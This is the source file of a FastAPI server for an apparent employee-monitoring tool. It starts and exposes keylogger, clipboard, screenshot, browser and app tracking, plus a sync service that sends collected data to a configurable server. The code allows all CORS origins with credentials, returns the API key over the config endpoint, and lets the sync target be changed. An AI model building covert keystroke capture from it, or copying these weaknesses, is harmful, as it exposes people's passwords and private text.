"""
FastAPI REST API Server

CHANGES (Bug Fixes):
- Bug 1: login() now calls auth_manager.verify_credentials() — the actual method name.
         My previous rewrite incorrectly used auth_manager.authenticate() which does
         not exist, causing AttributeError on every login attempt.
- Bug 2: verify_token() dependency now wraps auth_manager.verify_token() in try/except
         AND checks for None return. auth_manager.verify_token() no longer raises —
         it returns None. Both layers now cleanly return HTTP 401, never 500.
"""

from fastapi import FastAPI, HTTPException, Depends, Header
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional, List
import logging
from datetime import datetime, timedelta

from auth.auth_manager import AuthManager
from database.db_manager import DatabaseManager
from monitoring.screenshot import ScreenshotMonitor
from monitoring.clipboard import ClipboardMonitor
from monitoring.app_tracker import AppTracker
from monitoring.data_cleaner import CleanupService
from services.sync_service import SyncService
from utils.config_manager import ConfigManager
from monitoring.browser_tracker import BrowserTracker
from monitoring.keylogger import Keylogger

logger = logging.getLogger(__name__)

app = FastAPI(title="Enterprise Monitor API", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

auth_manager = AuthManager()
db_manager = DatabaseManager()
screenshot_monitor = ScreenshotMonitor(db_manager)
clipboard_monitor = ClipboardMonitor(db_manager)
app_tracker = AppTracker(db_manager)
browser_tracker = BrowserTracker(db_manager)
keylogger = Keylogger(db_manager)
cleanup_service = CleanupService(db_manager)
config_manager = ConfigManager()
sync_service = SyncService(db_manager, config_manager)

monitoring_active = True


# ─── PYDANTIC MODELS ─────────────────────────────────────────────────────────
class LoginRequest(BaseModel):
    username: str
    password: str

class LoginResponse(BaseModel):
    success: bool
    token: Optional[str] = None
    error: Optional[str] = None

class ChangePasswordRequest(BaseModel):
    old_password: str
    new_password: str

class StatisticsResponse(BaseModel):
    total_screenshots: int
    active_hours_today: float
    apps_tracked: int
    clipboard_events: int

class MonitoringStatusResponse(BaseModel):
    is_monitoring: bool
    uptime_seconds: int

class ScreenshotInfo(BaseModel):
    id: int
    timestamp: str
    file_path: str
    active_window: str
    active_app: str

class ConfigRequest(BaseModel):
    server_url: Optional[str] = None
    api_key: Optional[str] = None
    sync_interval_seconds: Optional[int] = None


# ─── AUTH DEPENDENCY ─────────────────────────────────────────────────────────
async def verify_token(authorization: Optional[str] = Header(None)):
    """
    FastAPI dependency. Extracts Bearer token and validates it.

    BUG 2 FIX: auth_manager.verify_token() now returns None instead of raising.
    We check for None here and raise HTTPException(401). Nothing can reach the
    server as a 500 from an expired or invalid token anymore.
    """
    if not authorization:
        raise HTTPException(status_code=401, detail="No authorization header")

    parts = authorization.split()
    if len(parts) != 2 or parts[0].lower() != "bearer":
        raise HTTPException(status_code=401, detail="Invalid authorization format")

    token = parts[1]

    try:
        payload = auth_manager.verify_token(token)
    except Exception as e:
        # auth_manager.verify_token() should never raise now, but keep this
        # as a hard safety net so a future regression cannot cause a 500.
        logger.error(f"Unexpected error in verify_token dependency: {e}")
        raise HTTPException(status_code=401, detail="Token validation error")

    if payload is None:
        # Covers: expired token, invalid signature, malformed token
        raise HTTPException(status_code=401, detail="Token is invalid or has expired")

    return payload


# ─── HEALTH ──────────────────────────────────────────────────────────────────
@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "platform": "windows",
        "timestamp": datetime.utcnow().isoformat()
    }

@app.get("/")
async def root():
    return {
        "name": "Enterprise Monitor API",
        "version": "1.0.0",
        "status": "running",
        "docs_url": "/docs"
    }


# ─── AUTH ENDPOINTS ──────────────────────────────────────────────────────────
@app.post("/api/auth/login", response_model=LoginResponse)
async def login(request: LoginRequest):
    """
    BUG 1 FIX: Was calling auth_manager.authenticate() — method does not exist.
    Correct method is verify_credentials(username, password) → bool.
    """
    try:
        is_valid = auth_manager.verify_credentials(request.username, request.password)
        if is_valid:
            token = auth_manager.create_token(request.username)
            return LoginResponse(success=True, token=token)
        return LoginResponse(success=False, error="Invalid credentials")
    except Exception as e:
        logger.error(f"Login error: {e}")
        return LoginResponse(success=False, error="Login failed")

@app.get("/api/auth/check")
async def check_auth(user=Depends(verify_token)):
    return {"authenticated": True, "username": user.get("sub")}

@app.post("/api/auth/change-password")
async def change_password(request: ChangePasswordRequest, user=Depends(verify_token)):
    if "sub" not in user:
        raise HTTPException(status_code=401, detail="Invalid token")
    username = user["sub"]
    if not auth_manager.verify_credentials(username, request.old_password):
        return {"success": False, "error": "Invalid old password"}
    try:
        auth_manager.change_password(username, request.new_password)
        return {"success": True, "message": "Password changed successfully"}
    except ValueError as e:
        return {"success": False, "error": str(e)}
    except Exception as e:
        logger.error(f"Password change error: {e}")
        return {"success": False, "error": "Failed to change password"}


# ─── STATISTICS ──────────────────────────────────────────────────────────────
@app.get("/api/statistics", response_model=StatisticsResponse)
async def get_statistics(date: Optional[str] = None, user=Depends(verify_token)):
    try:
        stats = db_manager.get_statistics(date=date)
        return StatisticsResponse(
            total_screenshots=stats.get("screenshots_today", 0),
            active_hours_today=stats.get("active_hours_today", 0.0),
            apps_tracked=stats.get("apps_tracked", 0),
            clipboard_events=stats.get("clipboard_events", 0)
        )
    except Exception as e:
        logger.error(f"Error getting statistics: {e}")
        raise HTTPException(status_code=500, detail="Failed to get statistics")

@app.get("/api/stats/activity")
async def get_activity_stats(start: str, end: str, user=Depends(verify_token)):
    try:
        return db_manager.get_activity_stats(start, end)
    except Exception as e:
        logger.error(f"Error getting activity stats: {e}")
        raise HTTPException(status_code=500, detail="Failed to get activity stats")

@app.get("/api/stats/timeline")
async def get_timeline_data(date: str, user=Depends(verify_token)):
    try:
        return db_manager.get_timeline_data(date)
    except Exception as e:
        logger.error(f"Error getting timeline data: {e}")
        raise HTTPException(status_code=500, detail="Failed to get timeline data")


# ─── SCREENSHOTS ─────────────────────────────────────────────────────────────
@app.get("/api/screenshots", response_model=List[ScreenshotInfo])
async def get_screenshots(limit: int = 20, offset: int = 0, user=Depends(verify_token)):
    try:
        screenshots = db_manager.get_screenshots(limit=limit, offset=offset)
        return [
            ScreenshotInfo(
                id=s["id"],
                timestamp=s["timestamp"],
                file_path=s["file_path"],
                active_window=s.get("active_window") or "",
                active_app=s.get("active_app") or ""
            )
            for s in screenshots
        ]
    except Exception as e:
        logger.error(f"Error getting screenshots: {e}")
        raise HTTPException(status_code=500, detail="Failed to get screenshots")


# ─── DATA ENDPOINTS ──────────────────────────────────────────────────────────
@app.get("/api/data/apps")
async def get_app_logs(limit: int = 50, offset: int = 0, user=Depends(verify_token)):
    try:
        return db_manager.get_app_activity_logs(limit, offset)
    except Exception as e:
        logger.error(f"Error getting app logs: {e}")
        raise HTTPException(status_code=500, detail="Failed to get app logs")

@app.get("/api/data/browser")
async def get_browser_logs(limit: int = 50, offset: int = 0, user=Depends(verify_token)):
    try:
        return db_manager.get_browser_activity_logs(limit, offset)
    except Exception as e:
        logger.error(f"Error getting browser logs: {e}")
        raise HTTPException(status_code=500, detail="Failed to get browser logs")

@app.get("/api/data/keylogs")
async def get_key_logs(limit: int = 100, offset: int = 0, user=Depends(verify_token)):
    try:
        return db_manager.get_text_logs(limit, offset)
    except Exception as e:
        logger.error(f"Error getting key logs: {e}")
        raise HTTPException(status_code=500, detail="Failed to get key logs")

@app.get("/api/data/clipboard")
async def get_clipboard_logs(limit: int = 50, offset: int = 0, user=Depends(verify_token)):
    try:
        return db_manager.get_clipboard_logs(limit, offset)
    except Exception as e:
        logger.error(f"Error getting clipboard logs: {e}")
        raise HTTPException(status_code=500, detail="Failed to get clipboard logs")


# ─── MONITORING CONTROL ──────────────────────────────────────────────────────
@app.get("/api/monitoring/status", response_model=MonitoringStatusResponse)
async def get_monitoring_status(user=Depends(verify_token)):
    global monitoring_active
    return MonitoringStatusResponse(
        is_monitoring=monitoring_active,
        uptime_seconds=screenshot_monitor.get_uptime()
    )

@app.post("/api/monitoring/pause")
async def pause_monitoring(user=Depends(verify_token)):
    global monitoring_active
    monitoring_active = False
    screenshot_monitor.pause()
    clipboard_monitor.pause()
    app_tracker.pause()
    browser_tracker.pause()
    keylogger.pause()
    logger.info("Monitoring paused")
    return {"success": True, "message": "Monitoring paused"}

@app.post("/api/monitoring/resume")
async def resume_monitoring(user=Depends(verify_token)):
    global monitoring_active
    monitoring_active = True
    screenshot_monitor.resume()
    clipboard_monitor.resume()
    app_tracker.resume()
    browser_tracker.resume()
    keylogger.resume()
    logger.info("Monitoring resumed")
    return {"success": True, "message": "Monitoring resumed"}


# ─── CONFIG ──────────────────────────────────────────────────────────────────
@app.get("/api/config")
async def get_config(user=Depends(verify_token)):
    return config_manager.config

@app.post("/api/config")
async def update_config(config: ConfigRequest, user=Depends(verify_token)):
    if config.server_url is not None:
        config_manager.set("server_url", config.server_url)
    if config.api_key is not None:
        config_manager.set("api_key", config.api_key)
    if config.sync_interval_seconds is not None:
        config_manager.set("sync_interval_seconds", config.sync_interval_seconds)
    return {"success": True, "config": config_manager.config}


# ─── LIFECYCLE ───────────────────────────────────────────────────────────────
@app.on_event("startup")
async def startup_event():
    logger.info("Starting monitoring services...")
    screenshot_monitor.start()
    clipboard_monitor.start()
    app_tracker.start()
    browser_tracker.start()
    keylogger.start()
    cleanup_service.start()
    sync_service.start()
    logger.info("All monitoring services started")

@app.on_event("shutdown")
async def shutdown_event():
    logger.info("Stopping monitoring services...")
    screenshot_monitor.stop()
    clipboard_monitor.stop()
    app_tracker.stop()
    browser_tracker.stop()
    keylogger.stop()
    cleanup_service.stop()
    sync_service.stop()
    logger.info("All monitoring services stopped")